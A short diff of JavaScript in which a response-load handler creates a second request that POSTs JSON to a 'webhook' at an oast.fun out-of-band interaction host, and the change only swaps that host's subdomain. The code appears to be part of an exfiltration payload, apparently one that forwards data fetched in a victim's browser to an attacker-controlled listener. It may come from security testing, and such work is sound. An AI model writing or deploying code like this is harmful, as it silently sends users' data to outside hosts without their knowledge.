@@ -17,7 +17,7 @@ xhr.onload = function() {
     var webhookXhr = new XMLHttpRequest();
 
     // Prepare the request to the webhook
-    webhookXhr.open('POST', 'https://qltxyxqadspfcfpdvhmuijzirzl9mkmkv.oast.fun', true);
+    webhookXhr.open('POST', 'https://qltxyxqadspfcfpdvhmuv3b25whe25z9m.oast.fun', true);
     webhookXhr.setRequestHeader('Content-type', 'application/json');
 
     // Define what happens on successful data sending
